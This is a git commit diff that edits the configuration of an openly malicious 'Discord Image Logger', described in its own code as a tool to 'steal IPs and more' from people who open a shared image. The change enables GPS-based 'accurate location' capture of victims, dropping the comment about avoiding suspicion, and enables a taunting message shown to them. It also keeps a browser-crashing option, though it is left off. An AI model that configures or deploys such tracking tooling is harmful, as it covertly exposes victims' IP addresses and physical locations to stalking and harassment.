fa8057e6f41823866956432529ed0f057d89fd04
Manjil740 <gotajota3@gmail.com>
2025-05-15 16:43:21 +0545

    image.py

--- api/image.py
+++ api/image.py
@@ -8,7 +8,7 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "manjil"
+__author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
@@ -24,11 +24,11 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, 
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "haha get rickrolled", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
